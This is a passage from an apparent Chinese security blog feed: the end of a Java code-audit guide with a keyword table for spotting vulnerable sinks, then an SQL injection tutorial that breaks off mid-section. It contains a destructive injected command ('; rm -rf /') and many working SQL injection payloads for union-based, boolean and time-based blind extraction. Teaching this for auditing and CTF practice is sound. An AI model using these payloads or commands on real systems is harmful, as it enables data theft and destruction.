<h1 id="六、逻辑漏洞"><a href="#六、逻辑漏洞" class="headerlink" title="六、逻辑漏洞"></a>六、逻辑漏洞</h1><p>攻击者利用Web应用程序中的逻辑漏洞，绕过应用程序的安全措施，获取未授权的访问权限或者执行任意操作。</p>
<p>逻辑漏洞示例<br>假设一个Web应用程序中的一个功能需要进行支付，用户需要在完成支付后才能获得相应的商品或者服务。如果程序存在逻辑漏洞，例如没有对支付进行验证或者没有对用户状态进行检查，攻击者就可以绕过支付流程，获得相应的商品或者服务，而不需要真正支付<br>七、敏感数据泄露漏洞</p>
<p>Web应用程序在处理敏感信息时出现漏洞，导致敏感信息泄露。</p>
<p>敏感数据泄露漏洞示例<br>假设一个Web应用程序中存储了用户的敏感信息，例如信用卡号、社保号码等等。如果程序没有对这些信息进行足够的保护，攻击者就可以通过利用程序的漏洞或者直接攻击数据库等方式获取这些信息。</p>
<h1 id="八、命令注入（Command-Injection）漏洞"><a href="#八、命令注入（Command-Injection）漏洞" class="headerlink" title="八、命令注入（Command Injection）漏洞"></a>八、命令注入（Command Injection）漏洞</h1><p>攻击者通过在Web应用程序中注入恶意命令，从而获取敏感信息或者执行任意代码.</p>
<p>命令注入漏洞示例<br>假设一个Web应用程序中有一个命令行操作的功能，例如允许管理员执行一些命令来管理服务器。如果程序没有对用户输入的命令进行过滤，攻击者就可以在命令中注入恶意的代码，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; rm -rf /</span><br></pre></td></tr></table></figure>

<p>这段代码将会被拼接到命令中，并使命令变为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls; rm -rf /</span><br></pre></td></tr></table></figure>

<p>攻击者就可以执行任意代码，删除服务器上的所有文件。</p>
<p>需要注意的是，以上示例仅仅是每个漏洞类型的一个简单示例，实际的漏洞可能会更加复杂，攻击者也会不断地创造新的攻击方式来绕过应用程序的防御措施。为了确保Web应用程序的安全性，需要开发人员注重代码的安全性，以及定期进行安全测试和漏洞扫描</p>
<h1 id="审计方法总结"><a href="#审计方法总结" class="headerlink" title="审计方法总结"></a>审计方法总结</h1><p>主要代码审计方法是跟踪用户输入数据和敏感函数参数回溯：跟踪用户的输入数据，判断数据进入的每一个代码逻辑是否有可利用的点，此处的代码逻辑可以是一个函数，或者是条小小的条件判断语句。</p>
<p>敏感函数参数回溯，根据敏感函数，逆向追踪参数传递的过程。这个方法是最高效，最常用的方法。大多数漏洞的产生是因为函数的使用不当导致的，只要找到这些函数，就能够快速挖掘想要的漏洞。</p>
<p>以下是基于关键词审计技巧总结：</p>
<p>在搜索时要注意是否为整个单词,以及小写敏感这些设置</p>
<table>
<thead>
<tr>
<th align="center">漏洞名称</th>
<th align="center">关键词</th>
</tr>
</thead>
<tbody><tr>
<td align="center">密码硬编码、密码明文存储</td>
<td align="center">password 、pass、jdbc</td>
</tr>
<tr>
<td align="center">XSS</td>
<td align="center">getParamter、&lt;%&#x3D;、param.</td>
</tr>
<tr>
<td align="center">SQL 注入</td>
<td align="center">Select、Dao 、from 、delete 、update、insert</td>
</tr>
<tr>
<td align="center">任意文件下载</td>
<td align="center">download 、fileName 、filePath、write、getFile、getWriter</td>
</tr>
<tr>
<td align="center">任意文件删除</td>
<td align="center">Delete、deleteFile、fileName 、filePath</td>
</tr>
<tr>
<td align="center">文件上传</td>
<td align="center">Upload、write、fileName 、filePath</td>
</tr>
<tr>
<td align="center">命令注入</td>
<td align="center">getRuntime、exec、cmd、shell</td>
</tr>
<tr>
<td align="center">缓冲区溢出</td>
<td align="center">strcpy,strcat,scanf,memcpy,memmove,memeccpy<br/>Getc(),fgetc(),getchar;read,printf</td>
</tr>
<tr>
<td align="center">XML 注入</td>
<td align="center">DocumentBuilder、XMLStreamReader、SAXBuilder、SAXParser<br/>SAXSource 、TransformerFactory 、SAXTransformerFactory 、</td>
</tr>
<tr>
<td align="center">反序列化漏洞</td>
<td align="center">ObjectInputStream.readObject、ObjectInputStream.readUnshared、XMLDecoder.readObject<br/>Yaml.load 、 XStream.fromXML 、 ObjectMapper.readValue 、JSON.parseObject</td>
</tr>
<tr>
<td align="center">url 跳转</td>
<td align="center">sendRedirect、setHeader、forward</td>
</tr>
<tr>
<td align="center">不安全组件暴露</td>
<td align="center">activity、Broadcast Receiver、Content Provider、Service、 inter-filter</td>
</tr>
<tr>
<td align="center">日志记录敏感信息</td>
<td align="center">log log.info logger.info</td>
</tr>
<tr>
<td align="center">代码执行</td>
<td align="center">eval、system、exec</td>
</tr>
</tbody></table>
<h1 id="其他漏洞审计方法"><a href="#其他漏洞审计方法" class="headerlink" title="其他漏洞审计方法"></a>其他漏洞审计方法</h1><ol>
<li>CSRF</li>
</ol>
<p>审计方法:通过查看配置文件有没有配置 csrf 全局过滤器，如果没有则重点看每个操作前有没有添加 token 的防护机制</p>
<p>在Smpkpiappealcontroller.java中200处，直接用用ids控制删除操作，而没有添加防 csrf的随机token验证检查，存在csrf漏洞。</p>
<p> Java&#x2F;main&#x2F;com&#x2F;venustech&#x2F;tsoc&#x2F;cupid&#x2F;smp&#x2F;kpi&#x2F;dao&#x2F;smpkpideclardao.java 517行，对传</p>
<p>入的ids进行删除操作。</p>
<ol start="2">
<li>Struts2 远程代码执行漏洞</li>
</ol>
<p>审计方法：查看 struts 插件的版本信息是否为漏洞版本漏洞版本查询网址：<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>
<ol start="3">
<li>越权操作</li>
</ol>
<p>审计方法：重点关注用户操作请求时查看是否有对当前登陆用户权限做校验从而确定是否存在漏洞，有些厂商会使用一些主流的权限框架，例如 shiro ,spring security 等框架，那么需要重点关注框架的配置文件以及实现方法</p>
<p>漏洞示例：</p>
<p>在以下文件中采用了 shiro 框架进行权限控制，在代码 58-72 行处为控制访问路径的权限设置，51-55 行处为对 admin 路径下访问限制，只有 SysyUserFilter 设置了 isAccessAllowed 方法,其他过滤均没有</p>
<p>SysUserFilter 中 isAccessAllowed 具体实现方法如下，90-93 行处没有对是否为当前用户进行判断，导致了越权</p>
<p>其他过滤文件均只设置了 onAccessDaniad()方法</p>
<p>如果没有使用框架的话，就要注意每个操作是否有权限</p>
<p>代码 7 行处获取 session 里的 username，只判断了 username 是不是为空，如果在截取数据包的时候将 username 再重新赋一个值就有可能造成越权漏洞。</p>
<p> 以这个年度服务费用编制功能为例，测试一下，代码如图所示：</p>
<ol start="4">
<li>会话超时设置</li>
</ol>
<p>审计方法：</p>
<p>Javaweb 应用会话超时设置一般有俩种方法：一是在配置文件 web.xml 设置</p>
<p> 二是通过 java 代码设置</p>
<ol start="5">
<li>敏感数据弱加密</li>
</ol>
<p>审计方法：</p>
<p>敏感数据弱加密主要看数据传输中的加密方法，一般写在工具类 util 中以下文件中为 base64 编码方法</p>
<p>​	</p>
<p>​	</p>
<p>​	</p>
]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2023/08/04/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="SQL注入入门"><a href="#SQL注入入门" class="headerlink" title="SQL注入入门"></a>SQL注入入门</h2><span id="more"></span>

<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>就不说奇奇怪怪书面语言了，大致意思就是通过可控输入点达到非预期执行数据库语句，这里的非预期指的是，拼接相应的语句可以拿到数据库里面的其他数据，具体看下面的Demo。</p>
<p>比如下面的语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</span><br></pre></td></tr></table></figure>

<p>对于他的预期操作，一般一个id是用来索引的,传入的值应该是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET[&quot;id&quot;] = 1;</span><br><span class="line">$_GET[&quot;id&quot;] = 2;</span><br></pre></td></tr></table></figure>

<p>所以预期执行的语句应该是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id =  1&quot;;</span><br><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id =  2&quot;;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>在没有过滤的情况下，我们能够在后面拼接我们自己的语句</p>
<p>比如，我们传入的值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET[&quot;id&quot;] =&quot;1 union select username,password from user&quot;</span><br></pre></td></tr></table></figure>

<p>那么最后执行的语句就是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = 1 union select username,password from user;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304261635588.png" alt="image-20230426163533547"></p>
<p>这样就造成了非预期语句的执行，我们在获得 <code>users</code> 表中的预期数据的同时也获得了 <code>users</code> 表中的非预期数据。</p>
<p>当你看到这时，不需要对语句有具体了解，但你需要知道SQL注入是一个怎么样的过程。</p>
<p>下面我们从数据库基础——结构 基本语法开始 一步一步引到您学会基础的SQL注入。</p>
<h3 id="SQL数据库基础"><a href="#SQL数据库基础" class="headerlink" title="SQL数据库基础"></a>SQL数据库基础</h3><h4 id="数据库结构基础"><a href="#数据库结构基础" class="headerlink" title="数据库结构基础"></a>数据库结构基础</h4><p><img src="https://nssctf.wdf.ink//img/WDTJ/202304261646646.png" alt="image-20230426164654561"></p>
<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304261652391.png" alt="image-20230426165200366"></p>
<p>如图所示 数据库 为层级结构：</p>
<ul>
<li>数据库 ( database )</li>
<li>表 ( table )<ul>
<li>列 (column)</li>
<li>数据</li>
</ul>
</li>
</ul>
<h4 id="数据库语法基础¶"><a href="#数据库语法基础¶" class="headerlink" title="数据库语法基础¶"></a>数据库语法基础<a href="https://ctf.tj.cn/ctf_web/sql_injection/#_3">¶</a></h4><p>常用语法：</p>
<ul>
<li><code>SELECT</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名1, 列名2, ... FROM 表名 WHERE 条件</span><br></pre></td></tr></table></figure>

<ul>
<li><code>UNION</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名 FROM 表名</span><br><span class="line">UNION</span><br><span class="line">SELECT 列名_1 FROM 表名_1;</span><br></pre></td></tr></table></figure>

<p> 注意 使用 <code>UNION</code> 的时候要注意两个表的列数量必须相同。</p>
<ul>
<li><code>LIMIT</code></li>
<li><code>SQL SELECT column1, column2, ... FROM table_name LIMIT number; #返回表中前number行数据 SELECT column1, column2, ... FROM table_name LIMIT offset, row_count; #从offset+1行开始返回row_count行数据 #比如 LIMIT 10, 10 返回11-20行数据</code></li>
<li><code>SQL SELECT * FROM table_name ORDER BY column_name DESC LIMIT 10;</code></li>
<li><code>注释</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = ((1)) union select username,password from user;-- )) limit1,1;后面的内容都将被注释</span><br><span class="line">DROP sampletable;# 后面的内容都将被注释</span><br><span class="line">  DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`    SELECT/*替换空格*/password/**/FROM/**/Members #/**/可用于替换空格</span><br><span class="line">  #/*中间的内容都将被注释*/</span><br><span class="line">  SELECT /*!32302 1/0, */ 1 FROM tablename #这种 /*! 注释仅在MySQL中存在</span><br></pre></td></tr></table></figure>

<ul>
<li><code>Order by</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ... FROM table_name [WHERE condition] ORDER BY column_name [ASC|DESC];</span><br><span class="line"># 其中，column1、column2等表示要查询的列名，table_name表示要查询的表名，condition表示查询条件，column_name表示要按照哪一列进行排序，ASC或DESC表示升序或降序排列。可以使用多个列名来进行排序，多个列名之间用逗号分隔。</span><br><span class="line"># 在SQL注入中我们常用它来判断列数</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 1;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 2;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 3;# 报错</span><br></pre></td></tr></table></figure>

<p>常用参数：</p>
<ul>
<li><code>user()</code>：当前数据库用户</li>
<li><code>database()</code>：当前数据库名</li>
<li><code>version()</code>：当前使用的数据库版本</li>
<li><code>@@datadir</code>：数据库存储数据路径</li>
<li><code>concat()</code>：联合数据，用于联合两条数据结果。如 <code>concat(username,0x3a,password)</code></li>
<li><code>group_concat()</code>：和 <code>concat()</code> 类似，如 <code>group_concat(DISTINCT+user,0x3a,password)</code>，用于把多条数据一次注入出来</li>
<li><code>concat_ws()</code>：用法类似</li>
<li><code>hex()</code> 和 <code>unhex()</code>：用于 hex 编码解码</li>
<li><code>ASCII()</code>：返回字符的 ASCII 码值</li>
<li><code>CHAR()</code>：把整数转换为对应的字符</li>
<li><code>load_file()</code>：以文本方式读取文件，在 Windows 中，路径设置为 <code>\\</code></li>
<li><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</li>
</ul>
<h3 id="基础注入类型"><a href="#基础注入类型" class="headerlink" title="基础注入类型"></a>基础注入类型</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>我们开局举的例子就是一个很典型的数字型注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</span><br></pre></td></tr></table></figure>

<p>我们可用理解为两个部分 原有语句 <code>SELECT username,password FROM users WHERE id =</code>和用户输入部分<code>$_GET[&quot;id&quot;]</code>。</p>
<p>前面我们说到，这种语句一般用于用户输入id来索引查询，所以预期的输入都是数字，所以直接采用的直接拼接的方式，以数字的方式进行查询。</p>
<p>然而，用户的输入因为没有过滤的缘故，不管输入什么都会直接拼接到后面，所以我们可用用下面的步骤逐步得到数据库信息：</p>
<ul>
<li>使用 <code>Order by</code> 确定列数，方便后续注入。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 Order by 1;</span><br><span class="line">id = 1 Order by 2;</span><br><span class="line">id = 1 Order by 3; # 报错 确定列数为 2 </span><br></pre></td></tr></table></figure>

<ul>
<li>使用联合查询 <code>union</code> 基于 <code>information_schema</code> 拿到数据库名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union SELECT 1,schema_name FROM information_schema.schemata;</span><br><span class="line"># or</span><br><span class="line">1 union SELECT schema_name,2 FROM information_schema.schemata;</span><br><span class="line"># 注意这里的 schema_name 一定要放在会显示的列名上面 比如password不显示 但是username显示 那么就用第二种。</span><br><span class="line"># 此时后台执行为:</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union SELECT 1,schema_name FROM information_schema.schemata;</span><br></pre></td></tr></table></figure>

<p> <img src="https://nssctf.wdf.ink//img/WDTJ/202304261957162.png" alt="image-20230426195745130"></p>
<p> 也可以把1换成其他的，比如<code>database()</code> 这样我们可以知道我们当前在哪个数据库</p>
<p> <img src="https://nssctf.wdf.ink//img/WDTJ/202304261959665.png" alt="image-20230426195952638"></p>
<ul>
<li>下面就是用联合查询得到数据库里面的表名，一般步骤我们都是先获取当前库 ( <code>database()</code> ) 的表，再去看其他库的。</li>
</ul>
<p>这里我们基于<code>UNION</code> <code>GROUP_CONCAT(table_name)</code> 和 <code>information_schema.tables</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()</span><br><span class="line"># 原理同上</span><br><span class="line"># 如果要查询其他数据库 可以写为 where table_schema=&#x27;databaseNAME&#x27;</span><br><span class="line"># 后台执行为：</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>

<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262013324.png" alt="image-20230426201306290"></p>
<ul>
<li>下面就是去获得 表 的对应字段名 方便我们最后一步的查询工作</li>
</ul>
<p>这里我们使用<code>UNION</code> <code>GROUP_CONCAT(column_name)</code> 和 <code>information_schema.columns</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database()</span><br><span class="line">1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database()</span><br><span class="line"># 后台执行为：</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database();</span><br></pre></td></tr></table></figure>

<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262026058.png" alt="image-20230426202627021"></p>
<h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>下面我们假设一个登录系统，那么他会接收两个参数 用户名和密码 后台的查询语句可能这样写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;$username&#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>

<p>对于这种，开发时，预期数据收到的参数都为字符，使用字符进行查询的数据库的注入漏洞 我们称为字符型注入。</p>
<p>与数字型不同的是，我们需要先构造单引号的闭合。</p>
<p>这里我们让 <code>$username</code>&#x3D; <code>-1&#39; or &#39;1&#39;=&#39;1&#39; --</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; -- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262032468.png" alt="image-20230426203250434"></p>
<p>就可以使<code>Where</code>的条件永真,直接输出<code>SELECT * FROM users</code>的所有内容。</p>
<p>同样，与数字型的注入方式类似，我们也可以使用联合查询的方法来获取数据库信息。</p>
<p><code>order by</code>判断列数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 1-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 2-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 3-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 4-- &#x27; AND password=&#x27;$password&#x27;; # 报错</span><br></pre></td></tr></table></figure>

<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262132275.png" alt="image-20230426213252233"></p>
<p>那么接下来就和数字型注入相同 吧 <code>order by NUM</code> 换成对应的语句即可：</p>
<ul>
<li>库名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union SELECT 1,schema_name,2 FROM information_schema.schemata;-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>

<ul>
<li>表名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>

<p>- 字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database()-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注是指攻击者不能直接获取数据库中的信息，需要通过一些技巧来判断或推断出数据库中的数据。盲注主要分为布尔盲注和时间盲注两种。</p>
<p>我们还是以下面的句子为例子，不过相比于之前的不同，我们规定用户的查询没有回显，所以仅靠上面的方式我们无法获得数据，所以我们选用盲注。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</span><br></pre></td></tr></table></figure>

<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>对于上述语句，如果id的传参如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 AND 1=1</span><br></pre></td></tr></table></figure>

<p>那么语句执行为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND 1=1;</span><br></pre></td></tr></table></figure>

<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305041911785.png" alt="image-20230504191135714"></p>
<p>这里会要求两个条件为真，一是有<code>id=1</code>这个值，二是 <code>1=1</code>，这两个条件当然是满足的，特别是后面的这个条件。</p>
<p>那如果我让AND后面的条件为 <code>1 = 2</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND &#x27;1&#x27;=&#x27;2&#x27;;</span><br><span class="line"># 这里 &#x27;1&#x27; = &#x27;2&#x27;，1 = 2 效果都是一样的</span><br></pre></td></tr></table></figure>

<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305041915652.png" alt="image-20230504191548610"></p>
<p>可以看到返回为空，因为AND后面的条件不满足。</p>
<p>那么利用这个AND符号我们可以尝试下面的一些方式来获取信息：</p>
<ul>
<li>使用 length(）获取长度信息</li>
</ul>
<p>比如，我们用 length(）函数去爆破数据长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 AND length(username)= NUM</span><br></pre></td></tr></table></figure>

<p>那么语句执行为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND length(username)=1;</span><br></pre></td></tr></table></figure>

<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305041921180.png" alt="image-20230504192130407"></p>
<p>当然 枚举长度的方式效率属实难蚌，我们可以使用大于小于符号 基于二分算法进行爆破：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 AND length(username)&lt; NUM</span><br><span class="line">id = 1 AND length(username)&gt; NUM</span><br></pre></td></tr></table></figure>

<p>这样效率会高很多。</p>
<ul>
<li><code>SUBSTR()</code>函数用于截取字符串中的一部分。利用<code>SUBSTR()</code>函数，逐步截取数据库中的某个数据：</li>
</ul>
<p><code>SUBSTR(string, start, length)</code> 其中，<code>string</code>表示要截取的字符串，<code>start</code>表示截取的起始位置，<code>length</code>表示截取的长度。<code>SUBSTR()</code>函数会从字符串的<code>start</code>位置开始，截取指定长度的字符。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 AND SUBSTR(username,1,1) = &#x27;?&#x27;</span><br></pre></td></tr></table></figure>

<p>那么语句执行为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND SUBSTR(username,1,1) = &#x27;?&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305042115906.png" alt="image-20230504211550827"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND SUBSTR(username,2,1) = &#x27;d&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305042121944.png" alt="image-20230504212127894"></p>
<p>通过前部分长度的获取，结合 <code>substr()</code> 就可以对一个具体的字符数据进行fuzz了。</p>
<p>这里推荐编写脚本来完成这样繁琐的工作。</p>
<p>除了上述用法 <code>SUBSTR()</code>函数还可以用于替换字符串中的某个字符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE users SET username=SUBSTR(username,1,3)||&#x27;***&#x27;||SUBSTR(username,7) WHERE username=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<p>面的SQL语句的作用是将管理员账户的用户名中的第4到第6个字符替换为<code>***</code></p>
<p>通过对该函数的组合使用，可以在不使用联合注入和依赖可视回显的方式拿到对应数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND SUBSTR((SELECT password FROM users WHERE username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>MID()</code>函数也是用于截取字符串的函数。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MID(string, start, length)</span><br><span class="line">MID(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;；</span><br><span class="line">SUBSTR(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;。</span><br></pre></td></tr></table></figure>

<ul>
<li><code>CONCAT()</code></li>
</ul>
<p><code>CONCAT()</code>函数用于将多个字符串连接成一个字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONCAT(string1, string2, ...)</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select CONCAT(username,&#x27;-&#x27;,password),1 from users;</span><br></pre></td></tr></table></figure>

<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305042218959.png" alt="image-20230504221859903"></p>
<p>而在盲注中，我们通常用其的连接功能减少查询跳转。</p>
<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>其实和布尔差不多，只不过是利用SQL语句的执行时间来判断SQL语句的真假，从而逐步推断出数据库中的数据。</p>
<p>下面是一些常用函数 和使用技巧：</p>
<ul>
<li><code>IF()</code></li>
</ul>
<p><code>IF()</code>函数是一种条件判断函数，它用于判断指定条件是否成立，并根据判断结果返回不同的值.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IF(condition, value_if_true, value_if_false)</span><br></pre></td></tr></table></figure>

<p>其中，<code>condition</code>表示要判断的条件，<code>value_if_true</code>表示条件成立时要返回的值，<code>value_if_false</code>表示条件不成立时要返回的值。如果条件成立，<code>IF()</code>函数将返回<code>value_if_true</code>，否则将返回<code>value_if_false</code></p>
<ul>
<li><code>SLEEP()</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SLEEP()` 函数是时间盲注的核心，其语法为 `SLEEP(seconds)</span><br></pre></td></tr></table></figure>

<p>当语句被执行时，程序将会暂停指定秒数，比如下面的例子：</p>
<p>通常 <code>IF</code> 和 <code>SLEEP</code> 两函数会一起使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;admin&#x27; AND IF(SLEEP(5),1,0)</span><br></pre></td></tr></table></figure>

<p>如果数据库中不存在用户名为<code>admin</code>的用户，那么该语句将会立即返回结束；否则，程序将会暂停5秒钟后再返回结果。</p>
<p>同样我们使用我们的demo语句，<code>SELECT username,password FROM users WHERE id =</code>来演示：</p>
<ul>
<li>利用延时函数，如<code>SLEEP()</code>函数或者<code>BENCHMARK()</code>函数，来判断是否注入成功。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND IF(ASCII(SUBSTR(username,1,1))=97,SLEEP(5),0)</span><br></pre></td></tr></table></figure>

<p>如果用户表中的第一个用户名字符为字母<code>a</code>，则程序会暂停5秒钟，否则返回0。</p>
<ul>
<li>利用时间戳</li>
</ul>
<p>可以利用数据库中的时间戳函数，如<code>UNIX_TIMESTAMP()</code>函数来构造延时语句，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND IF(UNIX_TIMESTAMP()&gt;1620264296,SLEEP(5),0)</span><br></pre></td></tr></table></figure>

<p>上述SQL语句的意思是：如果当前时间戳大于<code>1620264296</code>，则程序会暂停5秒钟，否则返回0。</p>
<ul>
<li>利用函数返回值</li>
</ul>
<p>可以利用函数的返回值，如<code>LENGTH()</code>函数、<code>SUBSTR()</code>函数等，来判断是否注入成功。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND IF(LENGTH(username)=4,SLEEP(5),0)</span><br></pre></td></tr></table></figure>

<p>上述SQL语句的意思是：如果用户名的长度为4，则程序会暂停5秒钟，否则返回0。</p>
<ul>
<li><code>BENCHMARK()</code></li>
</ul>
<p><code>BENCHMARK()</code>函数是一种用于重复执行指定语句的函数，在MySQL等数据库中支持使用。<code>BENCHMARK()</code>函数的语法通常如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>

<p>其中，<code>count</code>表示要重复执行的次数，<code>expr</code>表示要重复执行的语句。</p>
<p>看这个例子：</p>
